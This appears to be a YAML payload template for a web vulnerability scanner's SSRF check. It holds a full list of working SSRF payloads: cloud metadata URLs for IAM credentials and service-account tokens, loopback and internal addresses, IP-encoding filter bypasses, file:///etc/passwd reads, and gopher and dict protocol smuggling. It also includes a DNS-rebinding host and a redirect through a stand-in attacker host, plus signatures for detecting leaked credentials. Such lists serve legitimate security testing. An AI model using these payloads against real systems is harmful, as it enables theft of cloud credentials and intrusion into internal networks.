name: Server-Side Request Forgery (SSRF)
type: ssrf
description: "SSRF test payloads — localhost, internal IPs, cloud metadata, DNS rebinding, protocol smuggling"
detection: "check response for internal content, metadata or out-of-band interaction"
signatures:
  - "169.254.169.254"
  - "localhost"
  - "internal"
  - "ami-id"
  - "instance-id"
  - "iam/security-credentials"
  - "computeMetadata"
  - "root:x:"
  - "Connection refused"
  - "127.0.0.1"
payloads:
  # --- AWS Cloud Metadata ---
  - "http://169.254.169.254/latest/meta-data/"
  - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  - "http://169.254.169.254/latest/meta-data/hostname"
  - "http://169.254.169.254/latest/user-data"
  - "http://169.254.169.254/latest/dynamic/instance-identity/document"

  # --- GCP Cloud Metadata ---
  - "http://169.254.169.254/computeMetadata/v1/"
  - "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
  - "http://metadata.google.internal/"

  # --- Azure Cloud Metadata ---
  - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  - "http://169.254.169.254/metadata/v1/maintenance"

  # --- Localhost / loopback ---
  - "http://localhost/"
  - "http://127.0.0.1/"
  - "http://127.0.0.1:80/"
  - "http://127.0.0.1:443/"
  - "http://127.0.0.1:8080/"
  - "http://127.0.0.1:8443/"
  - "http://0.0.0.0/"
  - "http://[::1]/"
  - "http://0/"

  # --- Internal networks ---
  - "http://10.0.0.1/"
  - "http://10.0.0.1:80/"
  - "http://192.168.0.1/"
  - "http://192.168.1.1/"
  - "http://172.16.0.1/"
  - "http://172.17.0.1/"

  # --- Filter bypass ---
  - "http://127.1/"
  - "http://0177.0.0.1/"
  - "http://2130706433/"
  - "http://0x7f000001/"
  - "http://localhost.evil.com/"
  - "http://localtest.me/"
  - "http://spoofed.burpcollaborator.net/"

  # --- Non-standard schemes ---
  - "file:///etc/passwd"
  - "file:///C:/Windows/win.ini"
  - "dict://localhost:11211/stat"
  - "gopher://localhost:25/xHELO%20localhost"
  - "ftp://localhost/etc/passwd"

  # --- SSRF via DNS rebinding ---
  - "http://make-169.254.169.254-rebind-169.254.169.254-rbndr.us.host.repro.vg/"

  # --- SSRF via URL redirect ---
  - "http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/"
